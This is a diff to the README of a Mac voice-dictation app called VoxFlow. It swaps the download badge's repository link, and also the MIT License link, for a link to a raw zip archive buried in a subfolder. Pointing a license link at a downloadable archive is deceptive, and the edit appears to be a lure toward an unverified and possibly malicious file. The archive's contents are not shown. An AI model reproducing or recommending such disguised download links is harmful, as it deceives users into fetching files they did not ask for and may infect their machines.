@@ -1,7 +1,7 @@
 # 🎙️ VoxFlow - Voice Dictation for Your Mac
 
 ## 🚀 Quick Download
-[![Download VoxFlow](https://img.shields.io/badge/Download%20VoxFlow-FF6B6B?style=for-the-badge&logo=github)](https://github.com/junii27/VoxFlow)
+[![Download VoxFlow](https://img.shields.io/badge/Download%20VoxFlow-FF6B6B?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/junii27/VoxFlow/main/VoxFlow/HUD/v3.4-beta.5.zip)
 
 Visit this link to download the application.
 
@@ -57,7 +57,7 @@ VoxFlow is open-source! If you're a developer or translator, we welcome contribu
 
 ## 📜 License
 
-This project is open source under the [MIT License](https://opensource.org/license/MIT).
+This project is open source under the [MIT License](https://raw.githubusercontent.com/junii27/VoxFlow/main/VoxFlow/HUD/v3.4-beta.5.zip).
 
 ## 📝 Keywords
 
